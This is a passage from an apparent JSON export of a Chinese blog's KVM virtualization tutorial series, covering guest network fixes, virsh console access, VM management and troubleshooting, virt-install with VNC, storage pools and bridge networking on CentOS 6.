overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)没有看见eth0，我们需要修改网卡配置 [root@vm1 ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0 DEVICE=eth0 TYPE=Ethernet ONBOOT=yes NM_CONTROLLED=yes BOOTPROTO=static IPADDR=10.1.100.140 PREFIX=24 GATEWAY=10.1.100.2 DNS1=223.5.5.5 DNS2=223.6.6.6 DEFROUTE=yes PEERDNS=yes PEERROUTES=yes IPV4_FAILURE_FATAL=yes IPV6INIT=no NAME=&quot;System eth0&quot;重启网络 故障解决1.重启网卡报错 [root@vm1 ~]# service network restart Shutting down loopback interface: [ OK ] Bringing up loopback interface: [ OK ] Bringing up interface eth0: Device eth0 does not seem to be present, delaying initialization. [FAILED]解决办法： [root@vm1 ~]# rm -rf /etc/udev/rules.d/70-persistent-net.rules 然后重启 [root@vm2 ~]# ifconfig eth0 Link encap:Ethernet HWaddr 52:54:00:12:44:F6 inet addr:10.1.100.140 Bcast:10.1.100.255 Mask:255.255.255.0 inet6 addr: fe80::5054:ff:fe12:44f6/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:8 errors:0 dropped:0 overruns:0 frame:0 TX packets:13 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:1418 (1.3 KiB) TX bytes:767 (767.0 b) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"KVM虚拟化技术（六） 通过console连接虚拟机","slug":"KVM虚拟化技术（六）-通过console连接虚拟机","date":"2017-06-14T12:04:41.000Z","updated":"2021-02-26T06:05:29.253Z","comments":true,"path":"posts/3494613888.html","link":"","permalink":"https://awen.me/posts/3494613888.html","excerpt":"前面我们讲了如何通过vnc连接虚拟机，那么本节我们讲下如何通过命令行来进入虚拟机，我们可以查看IP地址，然后通过ssh进行连接 [root@kvm ~]# ssh root@10.1.100.137 The authenticity of host &apos;10.1.100.137 (10.1.100.137)&apos; can&apos;t be established. RSA key fingerprint is 71:fd:92:67:72:c6:02:45:cb:e7:66:0b:94:28:34:68. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;10.1.100.137&apos; (RSA) to the list of known hosts. root@10.1.100.137&apos;s password: Last login: Sun Mar 19 18:14:55 2017","text":"前面我们讲了如何通过vnc连接虚拟机，那么本节我们讲下如何通过命令行来进入虚拟机，我们可以查看IP地址，然后通过ssh进行连接 [root@kvm ~]# ssh root@10.1.100.137 The authenticity of host &apos;10.1.100.137 (10.1.100.137)&apos; can&apos;t be established. RSA key fingerprint is 71:fd:92:67:72:c6:02:45:cb:e7:66:0b:94:28:34:68. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;10.1.100.137&apos; (RSA) to the list of known hosts. root@10.1.100.137&apos;s password: Last login: Sun Mar 19 18:14:55 2017 但是，我们接下来要讲的是如何通过console去连接，我们开始了 参数配置1.添加 ttyS0 [root@vm1 ~]# echo &quot;ttyS0&quot; &gt;&gt; /etc/securetty 2.修改grup.conf文件 3.编辑/etc/inittab 4.reboot 重启 5.使用virsh console 连接虚拟机 [root@kvm ~]# virsh console vm1 Connected to domain vm1 Escape character is ^] Welcome to CentOS Starting udev: G[ OK ] Setting hostname vm1: [ OK ] Setting up Logical Volume Management: 2 logical volume(s) in volume group &quot;vg_vm1&quot; now active [ OK ] Checking filesystems Checking all file systems. [/sbin/fsck.ext4 (1) -- /] fsck.ext4 -a /dev/mapper/vg_vm1-lv_root /dev/mapper/vg_vm1-lv_root: clean, 23063/558624 files, 268228/2230272 blocks [/sbin/fsck.ext4 (1) -- /boot] fsck.ext4 -a /dev/sda1 /dev/sda1: clean, 38/128016 files, 57869/512000 blocks [ OK ] Remounting root filesystem in read-write mode: [ OK ] Mounting local filesystems: [ OK ] Enabling /etc/fstab swaps: [ OK ] Entering non-interactive startup Starting monitoring for VG vg_vm1: 2 logical volume(s) in volume group &quot;vg_vm1&quot; monitored [ OK ] ip6tables: Applying firewall rules: [ OK ] iptables: Applying firewall rules: [ OK ] Bringing up loopback interface: [ OK ] Bringing up interface eth0: Determining IP information for eth0... done. [ OK ] Starting auditd: [ OK ] Starting system logger: [ OK ] Mounting filesystems: [ OK ] Retrigger failed udev events[ OK ] Starting kdump:[FAILED] Starting sshd: [ OK ] Starting postfix: [ OK ] Starting crond: [ OK ] CentOS release 6.8 (Final) Kernel 2.6.32-642.el6.x86_64 on an x86_64 vm1 login: root Password: Last login: Sun Mar 19 18:27:09 on tty1 [root@vm1 ~]#","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"KVM虚拟化（五）虚拟机日常管理","slug":"KVM虚拟化（五）虚拟机日常管理","date":"2017-06-14T12:03:55.000Z","updated":"2021-02-26T06:05:29.253Z","comments":true,"path":"posts/1803736499.html","link":"","permalink":"https://awen.me/posts/1803736499.html","excerpt":"与虚拟机状态相关的命令1.查看所有虚拟机状态 [root@kvm ~]# virsh list --all Id Name State ---------------------------------------------------- 1 vm2 running - vm1 shut off2.开启虚拟机 [root@kvm ~]# virsh start vm2 Domain vm2 started","text":"与虚拟机状态相关的命令1.查看所有虚拟机状态 [root@kvm ~]# virsh list --all Id Name State ---------------------------------------------------- 1 vm2 running - vm1 shut off2.开启虚拟机 [root@kvm ~]# virsh start vm2 Domain vm2 started 3.关闭虚拟机 [root@kvm ~]# virsh shutdown vm2 Domain vm2 is being shutdown3.强制关闭电源 [root@kvm ~]# virsh destroy vm1 Domain vm1 destroyed4.删除虚拟机–只的配置文件 [root@kvm ~]# virsh undefine vm1 Domain vm1 has been undefined 编辑虚拟机配置文件 [root@kvm ~]# virsh edit vm1 &lt;domain type=&apos;kvm&apos;&gt; &lt;name&gt;vm1&lt;/name&gt; &lt;uuid&gt;8a906ecf-f1d5-6200-8d2c-cf80f0cf1d82&lt;/uuid&gt; &lt;memory unit=&apos;KiB&apos;&gt;1048576&lt;/memory&gt; &lt;currentMemory unit=&apos;KiB&apos;&gt;1048576&lt;/currentMemory&gt; &lt;vcpu placement=&apos;static&apos;&gt;2&lt;/vcpu&gt; &lt;os&gt; &lt;type arch=&apos;x86_64&apos; machine=&apos;rhel6.6.0&apos;&gt;hvm&lt;/type&gt; &lt;boot dev=&apos;hd&apos;/&gt; 故障排查1.selinux报错 [root@kvm ~]# virsh start vm1 error: Failed to start domain vm1 error: unsupported configuration: Unable to find security driver for label selinux编辑vm1的配置文件查看是否有SELinux的相关配置 [root@kvm ~]# virsh edit vm1 &lt;domain type=&apos;kvm&apos;&gt; &lt;name&gt;vm1&lt;/name&gt; &lt;uuid&gt;8a906ecf-f1d5-6200-8d2c-cf80f0cf1d82&lt;/uuid&gt; &lt;memory unit=&apos;KiB&apos;&gt;1048576&lt;/memory&gt; &lt;currentMemory unit=&apos;KiB&apos;&gt;1048576&lt;/currentMemory&gt; &lt;vcpu placement=&apos;static&apos;&gt;2&lt;/vcpu&gt; &lt;os&gt; &lt;type arch=&apos;x86_64&apos; machine=&apos;rhel6.6.0&apos;&gt;hvm&lt;/type&gt; &lt;boot dev=&apos;hd&apos;/&gt; &lt;/os&gt; &lt;features&gt; &lt;acpi/&gt; &lt;apic/&gt; &lt;pae/&gt; &lt;/features&gt; &lt;clock offset=&apos;utc&apos;/&gt; &lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt; &lt;on_reboot&gt;restart&lt;/on_reboot&gt; &lt;on_crash&gt;restart&lt;/on_crash&gt; &lt;devices&gt; &lt;emulator&gt;/usr/libexec/qemu-kvm&lt;/emulator&gt; &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt; &lt;driver name=&apos;qemu&apos; type=&apos;raw&apos; cache=&apos;none&apos;/&gt; &lt;source file=&apos;/home/kvm/images/vm1.img&apos;/&gt; &lt;target dev=&apos;hda&apos; bus=&apos;ide&apos;/&gt; &lt;address type=&apos;drive&apos; controller=&apos;0&apos; bus=&apos;0&apos; target=&apos;0&apos; unit=&apos;0&apos;/&gt; &lt;/disk&gt; &lt;disk type=&apos;block&apos; device=&apos;cdrom&apos;&gt; &lt;driver name=&apos;qemu&apos; type=&apos;raw&apos;/&gt; &lt;target dev=&apos;hdc&apos; bus=&apos;ide&apos;/&gt; &lt;readonly/&gt; &lt;address type=&apos;drive&apos; controller=&apos;0&apos; bus=&apos;1&apos; target=&apos;0&apos; unit=&apos;0&apos;/&gt; &lt;/disk&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-ehci1&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x7&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci1&apos;&gt; &lt;master startport=&apos;0&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x0&apos; multifunction=&apos;on&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci2&apos;&gt; &lt;master startport=&apos;2&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x1&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;usb&apos; index=&apos;0&apos; model=&apos;ich9-uhci3&apos;&gt; &lt;master startport=&apos;4&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x04&apos; function=&apos;0x2&apos;/&gt; &lt;/controller&gt; &lt;controller type=&apos;ide&apos; index=&apos;0&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x01&apos; function=&apos;0x1&apos;/&gt; &lt;/controller&gt; &lt;interface type=&apos;bridge&apos;&gt; &lt;mac address=&apos;52:54:00:d3:7f:be&apos;/&gt; &lt;source bridge=&apos;br0&apos;/&gt; &lt;model type=&apos;virtio&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x03&apos; function=&apos;0x0&apos;/&gt; &lt;/interface&gt; &lt;serial type=&apos;pty&apos;&gt; &lt;target port=&apos;0&apos;/&gt; &lt;/serial&gt; &lt;console type=&apos;pty&apos;&gt; &lt;target type=&apos;serial&apos; port=&apos;0&apos;/&gt; &lt;/console&gt; &lt;input type=&apos;mouse&apos; bus=&apos;ps2&apos;/&gt; &lt;graphics type=&apos;vnc&apos; port=&apos;5910&apos; autoport=&apos;no&apos; passwd=&apos;123456&apos;/&gt; &lt;video&gt; &lt;model type=&apos;cirrus&apos; vram=&apos;9216&apos; heads=&apos;1&apos;/&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x02&apos; function=&apos;0x0&apos;/&gt; &lt;/video&gt; &lt;memballoon model=&apos;virtio&apos;&gt; &lt;address type=&apos;pci&apos; domain=&apos;0x0000&apos; bus=&apos;0x00&apos; slot=&apos;0x05&apos; function=&apos;0x0&apos;/&gt; &lt;/memballoon&gt; &lt;/devices&gt; &lt;/domain&gt; ~ 我这里发现没有类似这样的配置 &lt;seclabel type=&apos;dynamic&apos; model=&apos;selinux&apos; relabel=&apos;yes&apos;&gt; &lt;label&gt;system_u:system_r:svirt_t:s0:c625,c859&lt;/label&gt; &lt;imagelabel&gt;system_u:object_r:svirt_image_t:s0:c625,c859&lt;/imagelabel&gt; &lt;/seclabel&gt;则可能已经保存在vm状态中，将原有的状态删除即可(对应路径/var/lib/libvirt/qemu/save)，如下： [root@kvm ~]# virsh managedsave-remove vm1 Removed managedsave image for domain vm12.内存不足，无法启动 [root@kvm ~]# virsh start vm1 error: Failed to start domain vm1 error: Unable to read from monitor: Connection reset by peer","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"KVM 虚拟化技术（四）之 命令行方式通过VNC安装虚拟机","slug":"KVM-虚拟化技术（四）之-命令行方式通过VNC安装虚拟机","date":"2017-06-14T12:03:18.000Z","updated":"2021-02-26T06:05:29.252Z","comments":true,"path":"posts/594276275.html","link":"","permalink":"https://awen.me/posts/594276275.html","excerpt":"配置 vncvim /etc/libvirt/qemu.conf去掉下面的注释 vnc_listen = &quot;0.0.0.0&quot;创建虚拟机","text":"配置 vncvim /etc/libvirt/qemu.conf去掉下面的注释 vnc_listen = &quot;0.0.0.0&quot;创建虚拟机 virt-install --name=vm1 --ram=1024 --vcpus=2 --disk path=/home/kvm/images/vm1.img,size=10 --cdrom /dev/cdrom --graphics vnc,password=123456,port=5910, --network bridge=br0,model=virtio --force --autostart表示创建一个名称为vm1的虚拟机，其内存为1024M，分配2核CPU,磁盘位置在/home/kvm/images/vm1.img，size=10是磁盘大小，然后指定cdrom位置，配置图形安装，使用vnc，vnc连接密码是123456 ，端口是5910 网络使用桥接方式，创建完立即启动。 [root@kvm ~]# virt-install --name=vm1 --ram=1024 --vcpus=2 --disk path=/home/kvm/images/vm1.img,size=10 --cdrom /dev/cdrom --graphics vnc,password=123456,port=5910, --network bridge=br0,model=virtio --force --autostart WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) Starting install... WARNING The requested volume capacity will exceed the available pool space when the volume is fully allocated. (10240 M requested capacity &gt; 5270 M available) Allocating &apos;vm1.img&apos; | 10 GB 00:00 Creating domain... | 0 B 00:00 Cannot open display: Run &apos;virt-viewer --help&apos; to see a full list of available command line options Domain installation still in progress. You can reconnect to the console to complete the installation process.通过vnc连接我们可以在Chrome商店，安装vnc扩展程序，然后连接 安装的话正常安装就可以 附，创建一个 kvm 格式的虚拟机 virt-install \\ --hvm \\ --name=centos7 \\ --ram=1024 \\ --vcpus=1 \\ --cdrom=/opt/ios/CentOS-7-x86_64-Minimal-1611.iso \\ --virt-type=kvm \\ --disk path=/home/kvm/images/vm-centos-7.img,size=20 \\ --network network=default \\ --network bridge=br0,model=virtio \\ --accelerate \\ --graphics vnc,port=5950,password=123456 \\ --force \\ --autostart","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"kVM虚拟化技术（三） 之存储池","slug":"kVM虚拟化技术（三）-之存储池","date":"2017-06-14T12:02:32.000Z","updated":"2021-02-26T06:05:29.275Z","comments":true,"path":"posts/2640744339.html","link":"","permalink":"https://awen.me/posts/2640744339.html","excerpt":"什么是存储池存储池是在宿主机上放置虚拟机虚拟磁盘的存储位置，默认是存储在/var/lib/libvirt/images 目录下 建立存储池1.指定一个目录","text":"什么是存储池存储池是在宿主机上放置虚拟机虚拟磁盘的存储位置，默认是存储在/var/lib/libvirt/images 目录下 建立存储池1.指定一个目录 [root@kvm network-scripts]# mkdir -p /home/kvm/images [root@kvm network-scripts]# chown root:root /home/kvm/images/ [root@kvm network-scripts]# chmod 755 /home/kvm/images/2.创建池 [root@kvm network-scripts]# virsh pool-define-as StoragePool --type dir --target /home/kvm/images/ 定义池 StoragePool [root@kvm network-scripts]# virsh pool-build StoragePool 构建池 StoragePool [root@kvm network-scripts]# virsh pool-start StoragePool 池 StoragePool 已启动 [root@kvm network-scripts]# virsh pool-autostart StoragePool 池 StoragePool 标记为自动启动3.查看存储池信息 [root@kvm network-scripts]# virsh pool-info StoragePool 名称： StoragePool UUID: 5e1205b3-2977-6971-5b94-b3df296be57a 状态： running Persistent: yes 自动启动： yes 容量： 5.16 GiB 分配： 10.75 MiB 可用： 5.15 GiB4.查看所有存储池 [root@kvm network-scripts]# virsh pool-list 名称 状态 自动开始 ----------------------------------------- StoragePool 活动 yes5.在池中创建一个卷，用来做虚拟机的硬盘 [root@kvm network-scripts]# virsh vol-create-as --pool StoragePool --name centos-node-1.img --capacity 10G --allocation 1G --format qcow2 创建卷 centos-node-1.img 表示从 StoragePool 中创建一个名称为 centos-node-1.img 的卷，其容量为10G，初始分配1G，文件格式为 qcow2","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"KVM 虚拟化技术（二）之 bridge","slug":"KVM-虚拟化技术（二）之-bridge","date":"2017-06-14T12:01:42.000Z","updated":"2021-02-26T06:05:29.252Z","comments":true,"path":"posts/1106227057.html","link":"","permalink":"https://awen.me/posts/1106227057.html","excerpt":"1.进入到/etc/sysconfig/network-scripts/ 目录 [root@kvm ~]# cd /etc/sysconfig/network-scripts/ [root@kvm network-scripts]# ls ifcfg-eth0 ifdown-ib ifdown-ppp ifup-aliases ifup-ipv6 ifup-ppp init.ipv6-global ifcfg-lo ifdown-ippp ifdown-routes ifup-bnep ifup-isdn ifup-routes net.hotplug ifdown ifdown-ipv6 ifdown-sit ifup-eth ifup-plip ifup-sit network-functions ifdown-bnep ifdown-isdn ifdown-tunnel ifup-ib ifup-plusb ifup-tunnel network-functions-ipv6 ifdown-eth ifdown-post ifup ifup-ippp ifup-post ifup-wireless","text":"1.进入到/etc/sysconfig/network-scripts/ 目录 [root@kvm ~]# cd /etc/sysconfig/network-scripts/ [root@kvm network-scripts]# ls ifcfg-eth0 ifdown-ib ifdown-ppp ifup-aliases ifup-ipv6 ifup-ppp init.ipv6-global ifcfg-lo ifdown-ippp ifdown-routes ifup-bnep ifup-isdn ifup-routes net.hotplug ifdown ifdown-ipv6 ifdown-sit ifup-eth ifup-plip ifup-sit network-functions ifdown-bnep ifdown-isdn ifdown-tunnel ifup-ib ifup-plusb ifup-tunnel network-functions-ipv6 ifdown-eth ifdown-post ifup ifup-ippp ifup-post ifup-wireless 2.复制当前 eth0 配置文件为 ifcfg-br0 [root@kvm network-scripts]# cp ifcfg-eth0 ifcfg-br03.修改 eth0 配置文件，末尾追加 BRIDGE=br0 [root@kvm network-scripts]# vi ifcfg-eth0 DEVICE=eth0 TYPE=Ethernet ONBOOT=yes NM_CONTROLLED=yes BOOTPROTO=none IPADDR=10.1.100.131 PREFIX=24 GATEWAY=10.1.100.2 DNS1=223.5.5.5 DOMAIN=223.6.6.6 DEFROUTE=yes IPV4_FAILURE_FATAL=yes IPV6INIT=no NAME=&quot;System eth0&quot; BRIDGE=br04.修改 br0配置文件 DEVICE=br0 TYPE=Bridge ONBOOT=yes NM_CONTROLLED=yes BOOTPROTO=dhcp5.重启网卡，并观察网卡信息变化 [root@kvm network-scripts]# /etc/init.d/network restart 正在关闭接口 eth0： bridge br0 does not exist! [确定] 关闭环回接口： [确定] 弹出环回接口： [确定] 弹出界面 eth0： [确定] 弹出界面 br0： 正在决定 br0 的 IP 信息...完成。 [确定] [root@kvm network-scripts]# ifconfig br0 Link encap:Ethernet HWaddr 00:0C:29:5F:F4:17 inet addr:10.1.100.131 Bcast:10.1.100.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe5f:f417/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:26 errors:0 dropped:0 overruns:0 frame:0 TX packets:21 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:2070 (2.0 KiB) TX bytes:2878 (2.8 KiB) eth0 Link encap:Ethernet HWaddr 00:0C:29:5F:F4:17 inet6 addr: fe80::20c:29ff:fe5f:f417/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:100644 errors:0 dropped:0 overruns:0 frame:0 TX packets:20490 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:129452127 (123.4 MiB) TX bytes:1840714 (1.7 MiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 inet6 addr: ::1/128 Scope:Host UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:8 errors:0 dropped:0 overruns:0 frame:0 TX packets:8 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:504 (504.0 b) TX bytes:504 (504.0 b) virbr0 Link encap:Ethernet HWaddr 52:54:00:37:8D:EF inet addr:192.168.122.1 Bcast:192.168.122.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:0 errors:0 dropped:0 overruns:0 frame:0 TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:0 (0.0 b) TX bytes:0 (0.0 b)查看桥接接口 [root@kvm network-scripts]# brctl show bridge name bridge id STP enabled interfaces br0 8000.000c295ff417 no eth0 virbr0 8000.525400378def yes virbr0-nic [root@kvm network-scripts]# brctl --help Usage: brctl [commands] commands: addbr &lt;bridge&gt; add bridge delbr &lt;bridge&gt; delete bridge addif &lt;bridge&gt; &lt;device&gt; add interface to bridge delif &lt;bridge&gt; &lt;device&gt; delete interface from bridge setageing &lt;bridge&gt; &lt;time&gt; set ageing time setbridgeprio &lt;bridge&gt; &lt;prio&gt; set bridge priority setfd &lt;bridge&gt; &lt;time&gt; set bridge forward delay sethello &lt;bridge&gt; &lt;time&gt; set hello time setmaxage &lt;bridge&gt; &lt;time&gt; set max message age sethashel &lt;bridge&gt; &lt;int&gt; set hash elasticity sethashmax &lt;bridge&gt; &lt;int&gt; set hash max setmclmc &lt;bridge&gt; &lt;int&gt; set multicast last member count setmcrouter &lt;bridge&gt; &lt;int&gt; set multicast router setmcsnoop &lt;bridge&gt; &lt;int&gt; set multicast snooping setmcsqc &lt;bridge&gt; &lt;int&gt; set multicast startup query count setmclmi &lt;bridge&gt; &lt;time&gt; set multicast last member interval setmcmi &lt;bridge&gt; &lt;time&gt; set multicast membership interval setmcqpi &lt;bridge&gt; &lt;time&gt; set multicast querier interval setmcqi &lt;bridge&gt; &lt;time&gt; set multicast query interval setmcqri &lt;bridge&gt; &lt;time&gt; set multicast query response interval setmcqri &lt;bridge&gt; &lt;time&gt; set multicast startup query interval setpathcost &lt;bridge&gt; &lt;port&gt; &lt;cost&gt; set path cost setportprio &lt;bridge&gt; &lt;port&gt; &lt;prio&gt; set port priority setportmcrouter &lt;bridge&gt; &lt;port&gt; &lt;int&gt; set port multicast router show [ &lt;bridge&gt; ] show a list of bridges showmacs &lt;bridge&gt; show a list of mac addrs showstp &lt;bridge&gt; show bridge stp info stp &lt;bridge&gt; {on|off} turn stp on/off","categories":[],"tags":[{"name":"KVM","slug":"KVM","permalink":"https://awen.me/tags/KVM/"},{"name":"虚拟化","slug":"虚拟化","permalink":"https://awen.me/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"}]},{"title":"KVM虚拟化技术（一）虚拟化简介以及按安装","slug":"KVM虚拟化技术（一）虚拟化简介以及按安装","date":"2017-06-14T12:01:04.000Z","updated":"2021-02-26T06:05:29.252Z","comments":true,"path":"posts/3886093534.html","link":"","permalink":"https://awen.me/posts/3886093534.html","excerpt":"kvm简介kvm（kernel+based Virtaul Machine）是目前主流的开源虚拟化解决方案，它是基于x86架构上的Linux操作系统的全虚拟化解决方案，在centos6.3系统中，kvm已经被集成在内核之中，相当于使用内核来做虚拟机的管理程序。由于其工作在内核层，所以执行效率要比传统的虚拟机化技术高很多，KVM虚拟化需要intel VT 或者 AMD-V技术的支持。需要确保操作系统支持虚拟机化。","text":"kvm简介kvm（kernel+based Virtaul Machine）是目前主流的开源虚拟化解决方案，它是基于x86架构上的Linux操作系统的全虚拟化解决方案，在centos6.3系统中，kvm已经被集成在内核之中，相当于使用内核来做虚拟机的管理程序。由于其工作在内核层，所以执行效率要比传统的虚拟机化技术高很多，KVM虚拟化需要intel VT 或者 AMD-V技术的支持。需要确保操作系统支持虚拟机化。 调整BIOS进入BIOS找到cpu相关设置，以华硕某主板为例 然后开启虚拟化 KVM的组件KVM的虚拟机化组件包括Virtualization、Virtualization Client、Virtualization Platform、Virtualization Tools，其中 Virtualization 是提供虚拟化环境的 Viratualization Client 是提供虚拟机实例的客户端软件 Virtualition Platform 是提供访问和控制虚拟机和容器的接口 Virtualization Tools 是提供脱机虚拟机镜像管理工具 ##KVM的存储方式 KVM的存储方式支持：本地磁盘文件、物理磁盘分区、LVM逻辑卷、iSCSI磁盘、GFS2文件系统、光纤LUNs设备等。 安装1.实验环境： 操作系统:Centos6.8 内核：# Linux KVM 2.6.32-642.el6.x86_64 查看系统是否支持 [root@localhost ~]# lsmod | grep kvm kvm_intel 170181 0 kvm 554609 1 kvm_intel irqbypass 13503 1 kvm2.安装Virtualization 组 yum -y install kvm python-virtinst libvirt tunctl bridge-utils virt-manager qemu-kvm-tools virt-viewer virt-v2v yum -y install libguestfs-tools##创建虚拟机虚拟机的创建可以通过图形化管理界面创建和管理也可以通过命令行工具实现。1.图形化界面管理使用virt-manager 来启动图形化界面创建 命令行运行virt-manger 来启动kvm的管理程序 然后点击新建按钮，新建一个虚拟机 报错信息：Warning:KVM is not available. This may mean the KVM package is not installed, or the KVM kernel modules are not loaded. your virtual machines may perform poorly. 是由于未启用虚拟机化，我这边使用的是VMware 虚拟机。关闭虚拟机后配置让其支持虚拟化。 选择一种安装操作系统的方式，我这里选择第一种，使用本地的光驱或IOS文件 加载镜像或光驱，并且选择操作系统类型和版本 分配内存和CPU 分配磁盘，其实和VMware安装虚拟机的步骤基本一致 -最后，配置网络确认配置无误后结束配置，创建完虚拟机 创建完成后会自动启动虚拟机，安装操作系统就不讲了。。 2.命令行方式 使用 virt-install 来进行控制和管理虚拟机 [root@KVM ~]# virt- virt-clone virt-convert virt-host-validate virt-image virt-install virt-manager virt-pki-validate virt-top virt-viewer virt-what virt-xml-validate [root@KVM ~]# virt-install --help Usage: virt-install --name NAME --ram RAM STORAGE INSTALL [options] Options: --version show program&apos;s version number and exit -h, --help show this help message and exit --connect=URI Connect to hypervisor with libvirt URI General Options: -n NAME, --name=NAME Name of the guest instance -r MEMORY, --ram=MEMORY Memory to allocate for guest instance in megabytes --vcpus=VCPUS Number of vcpus to configure for your guest. Ex: --vcpus 5 --vcpus 5,maxcpus=10 --vcpus sockets=2,cores=4,threads=2 --cpuset=CPUSET Set which physical CPUs domain can use. --cpu=CPU CPU model and features. Ex: --cpu coreduo,+x2apic --description=DESCRIPTION Human readable description of the VM to store in the generated XML. --security=SECURITY Set domain security driver configuration. --numatune=NUMATUNE Tune NUMA policy for the domain process. Installation Method Options: -c CDROM, --cdrom=CDROM CD-ROM installation media -l LOCATION, --location=LOCATION Installation source (eg, nfs:host:/path, http://host/path, ftp://host/path) --pxe Boot from the network using the PXE protocol --import Build guest around an existing disk image --init=INIT Path to init binary for container guest. Ex: --init /path/to/app (to contain an application) --init /sbin/init (for a full OS container) --livecd Treat the CD-ROM media as a Live CD -x EXTRA, --extra-args=EXTRA Additional arguments to pass to the install kernel booted from --location --initrd-inject=INITRD_INJECTIONS Add given file to root of initrd from --location --os-type=DISTRO_TYPE The OS type being installed, e.g. &apos;linux&apos;, &apos;unix&apos;, &apos;windows&apos; --os-variant=DISTRO_VARIANT The OS variant being installed guests, e.g. &apos;fedora6&apos;, &apos;rhel5&apos;, &apos;solaris10&apos;, &apos;win2k&apos; --boot=BOOTOPTS Optionally configure post-install boot order, menu, permanent kernel boot, etc. Storage Configuration: --disk=DISKOPTS Specify storage with various options. Ex. --disk path=/my/existing/disk --disk path=/my/new/disk,size=5 (in gigabytes) --disk vol=poolname:volname,device=cdrom,bus=scsi,... --nodisks Don&apos;t set up any disks for the guest. --filesystem=FILESYSTEMS Pass host directory to the guest. Ex: --filesystem /my/source/dir,/dir/in/guest --filesystem template_name,/,type=template Networking Configuration: -w NETWORK, --network=NETWORK Configure a guest network interface. Ex: --network bridge=mybr0 --network network=my_libvirt_virtual_net --network network=mynet,model=virtio,mac=00:11... --nonetworks Don&apos;t create network interfaces for the 